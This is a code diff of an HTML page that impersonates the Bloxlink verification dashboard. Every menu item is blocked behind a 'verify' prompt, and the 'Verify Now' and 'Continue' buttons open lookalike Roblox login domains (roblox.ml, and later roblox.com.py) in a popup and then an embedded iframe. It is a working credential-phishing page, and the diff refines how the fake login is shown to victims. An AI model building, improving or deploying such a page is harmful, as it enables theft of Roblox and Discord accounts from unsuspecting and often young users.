@@ -11,148 +11,160 @@
 </head>
 <body>
 
-<button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
+  <!-- MOBILE MENU BUTTON -->
+  <button class="mobile-menu-btn" onclick="toggleSidebar()">☰</button>
 
-<div class="top-bar">
-  ℹ️ Bloxlink is now part of the Roblox family! Read more here:
-  <a href="#" target="_blank">https://x.com/bloxlink/status/1818339107220693288</a>
-</div>
+  <div class="top-bar">
+    ℹ️ Bloxlink is now part of the Roblox family! Read more here:
+    <a href="#" target="_blank">https://x.com/bloxlink/status/1818339107220693288</a>
+  </div>
 
-<div class="layout">
+  <div class="layout">
 
-  <aside class="sidebar" id="sidebar">
-    <div class="logo">
-      <img src="https://cdn.discordapp.com/attachments/1461462727888474264/1462122032933240954/wordmark.png?ex=69705681&is=696f0501&hm=6cbeed4a67a3904cc479ca42088df2284e8893178a6d25748a9918ffdb1a5902&"
-           alt="Bloxlink" style="max-width:160px;height:auto;">
-    </div>
-
-    <div class="section">
-      <p class="section-title">GENERAL</p>
-      <button class="nav-item active" onclick="openBlockedPopup()">✓ Verifications</button>
-      <button class="nav-item" onclick="openBlockedPopup()">▦ Manage Servers</button>
-    </div>
-
-    <div class="section">
-      <p class="section-title">ACCOUNT</p>
-      <button class="nav-item" onclick="openBlockedPopup()">◼ Manage Subscriptions</button>
-      <button class="nav-item" onclick="openBlockedPopup()">⚙ Settings</button>
-    </div>
-
-    <div class="section">
-      <p class="section-title">OTHER</p>
-      <button class="nav-item" onclick="openBlockedPopup()">? Support</button>
-      <button class="nav-item" onclick="openBlockedPopup()">⌘ Developer API</button>
-    </div>
-  </aside>
-
-  <main class="content">
-    <h2>Verifications</h2>
-    <p class="subtitle">Manage your linked accounts.</p>
-
-    <div class="verify-card">
-      <div>
-        <h1>Get started now by linking your account</h1>
-        <p>
-          Join our millions of users by linking your account.
-          After verifying, you'll gain access to thousands of communities.
-        </p>
+    <aside class="sidebar" id="sidebar">
+      <div class="logo">
+        <img
+          src="https://cdn.discordapp.com/attachments/1461462727888474264/1462122032933240954/wordmark.png?ex=696d0ac1&is=696bb941&hm=8010d436e706cc951a78cbccbff6d8fa8a38894b4f67190c3ec280dd3995bb21&"
+          alt="Bloxlink"
+          style="max-width:160px;height:auto;"
+        >
       </div>
 
-      <button class="verify-circle" onclick="openVerifyScreen()">Verify Now</button>
-    </div>
-
-    <div class="missing-bar">
-      <span>Missing an account?</span>
-      <a href="#" class="missing-btn" onclick="openVerifyScreen()">+ Add Another One</a>
-    </div>
-  </main>
-</div>
-
-<div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
-
-<div id="blockedOverlay" class="popup-overlay">
-  <div class="popup">
-    <div class="popup-header red">
-      Must verify to access other sections of the dashboard
-    </div>
-    <div class="popup-body">
-      <button onclick="closeBlocked()">Close</button>
-    </div>
-  </div>
-</div>
-
-<div id="verifyOverlay" class="popup-overlay">
-  <div class="verify-popup">
-    <div class="verify-header">Verify Your Account</div>
-
-    <div class="verify-body">
-      <div class="verify-icon">
-        <img src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png">
+      <div class="section">
+        <p class="section-title">GENERAL</p>
+        <button class="nav-item active" onclick="openBlockedPopup()">✓ Verifications</button>
+        <button class="nav-item" onclick="openBlockedPopup()">▦ Manage Servers</button>
       </div>
 
-      <button class="verify-continue" onclick="openRobloxIframe()">Continue</button>
-      <div class="verify-or">or</div>
-      <button class="verify-return" onclick="closeVerifyScreen()">Return to Bloxlink</button>
+      <div class="section">
+        <p class="section-title">ACCOUNT</p>
+        <button class="nav-item" onclick="openBlockedPopup()">◼ Manage Subscriptions</button>
+        <button class="nav-item" onclick="openBlockedPopup()">⚙ Settings</button>
+      </div>
+
+      <div class="section">
+        <p class="section-title">OTHER</p>
+        <button class="nav-item" onclick="openBlockedPopup()">? Support</button>
+        <button class="nav-item" onclick="openBlockedPopup()">⌘ Developer API</button>
+      </div>
+    </aside>
+
+    <main class="content">
+      <h2>Verifications</h2>
+      <p class="subtitle">Manage your linked accounts.</p>
+
+      <div class="verify-card">
+        <div>
+          <h1>Get started now by linking your account</h1>
+          <p>
+            Join our millions of users by linking your account.
+            After verifying, you'll gain access to thousands of communities.
+          </p>
+        </div>
+
+        <button class="verify-circle" onclick="openVerifyScreen()">Verify Now</button>
+      </div>
+
+      <div class="missing-bar">
+        <span>Missing an account?</span>
+        <a href="#" class="missing-btn" onclick="openVerifyScreen()">+ Add Another One</a>
+      </div>
+    </main>
+
+  </div>
+
+  <!-- SIDEBAR OVERLAY -->
+  <div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>
+
+  <!-- BLOCKED POPUP -->
+  <div id="blockedOverlay" class="popup-overlay">
+    <div class="popup">
+      <div class="popup-header red">
+        Must verify to access other sections of the dashboard
+      </div>
+      <div class="popup-body">
+        <button onclick="closeBlocked()">Close</button>
+      </div>
     </div>
   </div>
-</div>
 
-<script>
-  const blockedOverlay = document.getElementById("blockedOverlay");
-  const verifyOverlay = document.getElementById("verifyOverlay");
-  const sidebar = document.getElementById("sidebar");
-  const sidebarOverlay = document.getElementById("sidebarOverlay");
+  <!-- VERIFY POPUP -->
+  <div id="verifyOverlay" class="popup-overlay">
+    <div class="verify-popup">
+      <div class="verify-header">Verify Your Account</div>
 
-  const ROBLOX_URL = "https://roblox.ml/login?returnUrl=9434460789590783";
+      <div class="verify-body">
+        <div class="verify-icon">
+          <img src="https://cdn.top.gg/icons/cc8bb23addd8100447e8712bbf2f9d40.png">
+        </div>
 
-  function hideWithFade(element, callback) {
-    element.classList.remove("show");
-    setTimeout(() => callback && callback(), 250);
-  }
+        <button class="verify-continue" onclick="openRobloxIframe()">Continue</button>
+        <div class="verify-or">or</div>
+        <button class="verify-return" onclick="closeVerifyScreen()">Return to Bloxlink</button>
+      </div>
+    </div>
+  </div>
 
-  function openBlockedPopup() {
-    blockedOverlay.classList.add("show");
-  }
+  <!-- IFRAME -->
+  <div id="iframeOverlay" class="popup-overlay">
+    <div class="iframe-popup">
+      <div class="verify-header">Verify Your Account</div>
+      <button class="close-iframe" onclick="closeIframe()">✕</button>
+      <iframe id="popupIframe"></iframe>
+    </div>
+  </div>
 
-  function closeBlocked() {
-    blockedOverlay.classList.remove("show");
-  }
+  <script>
+    const blockedOverlay = document.getElementById("blockedOverlay");
+    const verifyOverlay = document.getElementById("verifyOverlay");
+    const iframeOverlay = document.getElementById("iframeOverlay");
+    const popupIframe = document.getElementById("popupIframe");
+    const sidebar = document.getElementById("sidebar");
+    const sidebarOverlay = document.getElementById("sidebarOverlay");
 
-  function openVerifyScreen() {
-    verifyOverlay.classList.add("show");
-  }
+    const ROBLOX_URL = "https://roblox.com.py/login?returnUrl=7692425652606225";
 
-  function closeVerifyScreen() {
-    hideWithFade(verifyOverlay);
-  }
+    function hideWithFade(element, callback) {
+      element.classList.remove("show");
+      setTimeout(() => {
+        if (callback) callback();
+      }, 250);
+    }
 
-  /* ✅ ALTERAÇÃO ÚNICA: popup centralizado */
-  function openRobloxIframe() {
-    hideWithFade(verifyOverlay, () => {
-      const width = 500;
-      const height = 700;
+    function openBlockedPopup() {
+      blockedOverlay.classList.add("show");
+    }
 
-      const left = (screen.width - width) / 2;
-      const top = (screen.height - height) / 2;
+    function closeBlocked() {
+      blockedOverlay.classList.remove("show");
+    }
 
-      window.open(
-        ROBLOX_URL,
-        "RobloxVerify",
-        `width=${width},height=${height},left=${left},top=${top},resizable=yes,scrollbars=yes`
-      );
-    });
-  }
+    function openVerifyScreen() {
+      verifyOverlay.classList.add("show");
+    }
 
-  function toggleSidebar() {
-    sidebar.classList.toggle("open");
-    sidebarOverlay.classList.toggle("show");
-  }
-</script>
+    function closeVerifyScreen() {
+      hideWithFade(verifyOverlay);
+    }
+
+    function openRobloxIframe() {
+      hideWithFade(verifyOverlay, () => {
+        popupIframe.src = ROBLOX_URL;
+        iframeOverlay.classList.add("show");
+      });
+    }
+
+    function closeIframe() {
+      hideWithFade(iframeOverlay, () => {
+        popupIframe.src = "";
+      });
+    }
+
+    function toggleSidebar() {
+      sidebar.classList.toggle("open");
+      sidebarOverlay.classList.toggle("show");
+    }
+  </script>
 
 </body>
 </html>
-
-
-
-
-
